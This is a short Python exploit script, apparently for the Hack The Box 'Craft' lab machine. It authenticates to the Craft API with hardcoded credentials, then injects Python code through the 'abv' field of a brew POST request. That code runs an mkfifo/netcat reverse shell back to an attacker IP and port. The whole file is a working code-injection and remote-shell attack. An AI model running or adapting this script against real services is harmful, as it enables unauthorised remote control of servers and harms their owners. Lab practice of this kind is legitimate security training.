#!/usr/bin/env python

import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
 
LHOST = "10.10.14.17"
LPORT = "7900"

print(color.PURPLE + "\n[*] Craft exploit created by XMA")
print("---------------------------------\n" + color.END)

print(color.BLUE + "[i] Don't forget to set your netcat listener at port " + LPORT + color.END)
print("[*] Requesting a token")
response = requests.get("https://api.craft.htb/api/auth/login",  auth=("dinesh", "4aUh0A8PbVJxgd"), verify=False)
json_response = json.loads(response.text)
token = json_response["token"]
print("[*] Token: " + token)
 
print("[*] Validating authorization")
headers = { "X-Craft-API-Token": token, "Content-Type": "application/json" }
response = requests.get("https://api.craft.htb/api/auth/check", headers=headers, verify=False)
print("[*] Response: " + response.json()["message"])
 
print("[*] Connecting a reverse shell at " + LHOST + ":" + LPORT)
brew = {}
brew["abv"] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f')" % (LHOST, LPORT)
brew["name"] = "bullshit"
brew["brewer"] = "bullshit"
brew["style"] = "bullshit"
json_data = json.dumps(brew)
response = requests.post("https://api.craft.htb/api/brew/", headers=headers, data=json_data, verify=False)

